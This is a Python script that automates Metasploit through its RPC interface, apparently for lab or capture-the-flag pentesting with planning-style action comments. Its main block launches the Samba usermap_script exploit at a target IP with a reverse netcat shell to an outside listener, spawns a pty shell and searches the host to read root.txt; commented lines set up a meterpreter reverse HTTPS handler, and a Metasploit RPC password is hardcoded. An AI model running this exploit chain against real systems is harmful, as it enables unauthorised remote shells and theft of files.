import re

from pymetasploit3.msfrpc import *

def read_multiple_lines(shell):
    result = []
    while True:
        r = shell.read()
        if r != '':
            result.append(r)
        else:
            break
    
    return ''.join(result)

class MetasploitExecutor:
    def __init__(self, password = None, host_ip = None, listening_port = None, config = None):
        """
        It sets up the initial state by assigning values to instance attributes.
        """
        if config:
            self.client = MsfRpcClient(config['metasploit']['password'], port=int(config['metasploit']['listening_port']))
            self.host = config['metasploit']['host_ip']
            self.listening_port = config['metasploit']['listening_port']
        else:
            self.client = MsfRpcClient(password, port=55552)
            self.host = host_ip
            self.listening_port = listening_port

    def exploit_and_execute_payload(self,
                                    target,
                                    exploit_module_name,
                                    payload_module_name,
                                    listening_host = None,
                                    listening_port = None):
        exploit = self.client.modules.use('exploit', exploit_module_name)

        if target:
            exploit['RHOSTS'] = target

        payload = self.client.modules.use('payload', payload_module_name)
        
        # If listening_host wasn't provided, use the instance attribute (self.host)
        if listening_host is None:
            listening_host = self.host

        # If listening_port wasn't provided, use the instance attribute (self.listening_port)
        if listening_port is None:
            listening_port = self.listening_port

        payload['LHOST'] = listening_host
        payload['LPORT'] = listening_port

        exploit.execute(payload=payload)

    def set_exploit_module(self, exploit_module_name, target = None):
        self.exploit = self.client.modules.use('exploit', exploit_module_name)

        if target:
            self.exploit['RHOSTS'] = target

    def set_payload_module(self, payload_module_name, listening_host = None, listening_port = None):
        self.payload = self.client.modules.use('payload', payload_module_name)
        
        # If listening_host wasn't provided, use the instance attribute (self.host)
        if listening_host is None:
            listening_host = self.host

        # If listening_port wasn't provided, use the instance attribute (self.listening_port)
        if listening_port is None:
            listening_port = self.listening_port

        self.payload['LHOST'] = listening_host
        self.payload['LPORT'] = listening_port

    # def run(self):
    #     old_session_list = set(self.get_sessions().keys())
    #     self.exploit.execute(payload=self.payload)
    #     session_list = set(self.get_sessions().keys())
    #     new_sessions = session_list - old_session_list
    #     print(f"Got new sessions {new_sessions}.")
    #     self.set_default_session(list(new_sessions)[0])

    def run(self):
        cid = self.client.call(MsfRpcMethod.ConsoleCreate)['id']
        out = self.client.consoles.console(cid).run_module_with_output(self.exploit, payload=self.payload)
        # print(out)
        match = re.search(r"Session (\d+) created", out)
        if match:
            session_number = match.group(1)
            print(f"Got a new session {session_number}!")
            self.set_default_session(session_number)
        else:
            print("Cannot find new session id after executing the module!")
            print(out)
        destroy = self.client.call(MsfRpcMethod.ConsoleDestroy, [cid])

    def set_default_session(self, default_session_id):
        self.default_session_id = default_session_id
        print(f"Set the default session id as: {default_session_id}!")

    def get_sessions(self):
        return self.client.sessions.list
        
    def communicate_with_msf_session(self,
                                     input_text,
                                     session_id = None):
        if session_id == None:
            session_id = self.default_session_id
        shell = self.client.sessions.session(session_id)
        shell.write(input_text)
        print(read_multiple_lines(shell))
        # print(shell.read())


# (:action use-exploit-slash-multi-slash-samba-slash-usermap_script
#     :parameters (?target - host ?p - payload)
#     :precondition (and
#       (running_smbd_3_0_20 ?target)
#       (not (executed ?target ?p)))
#     :effect (and
#       (executed_payload-slash-cmd-slash-unix-slash-reverse_netcat ?target ?p)
#       (executed_payload-slash-cmd-slash-unix-slash-adduser ?target ?p))
#   )

# (:action execute-cmd-slash-unix-slash-reverse_netcat
#     :parameters (?target - host ?p - payload)
#     :precondition (and
#       (executed_payload-slash-cmd-slash-unix-slash-reverse_netcat ?target ?p)
#       (not (have_an_interactive_shell ?target)))
#     :effect (and
#       (have_an_interactive_shell ?target))
#   )

if __name__ == "__main__":
    me = MetasploitExecutor(password = 'glycNshR', host_ip = '127.0.0.1', listening_port=55552)
    # me.exploit_and_execute_payload(
    #                 target = None,
    #                 exploit_module_name = "exploit/multi/handler",
    #                 payload_module_name = "windows/x64/meterpreter_reverse_https",
    #                 listening_host = "192.168.56.39",
    #                 listening_port = "8443")

    me.set_exploit_module("multi/samba/usermap_script", "10.129.242.56")
    me.set_payload_module("cmd/unix/reverse_netcat", "10.10.16.23", 4444)
    me.run()

    # me = MetasploitExecutor(password = 'password', host_ip = '10.10.14.3', listening_port=4444)
    # me.exploit_and_execute_payload(
    #     target = '10.10.10.3',
    #     exploit_module_name = 'multi/samba/usermap_script',
    #     payload_module_name= 'cmd/unix/reverse_netcat'
    #     )

    # me.communicate_with_msf_session(
    #     session_id = '86',
    #     input_text = "whoami"
    #     )

    # sessions = me.get_sessions()
    # print(sessions)

    me.communicate_with_msf_session(
        input_text = "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
        )

    me.communicate_with_msf_session(
        input_text = f"find / -name root.txt -type f -exec cat {{}} \\; 2>/dev/null"
        )

    # me.communicate_with_msf_session(
    #     session_id = "93",
    #     input_text = "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
    #     )

    # me.communicate_with_msf_session(
    #     session_id = "93",
    #     input_text = f"find / -name root.txt -type f -exec cat {{}} \\; 2>/dev/null"
    #     )

    # me.communicate_with_msf_session(
    #     session_id = '1',
    #     input_text = "cd root"
    #     )

    # me.communicate_with_msf_session(
    #     session_id = '1',
    #     input_text = "cat root.txt"
    #     )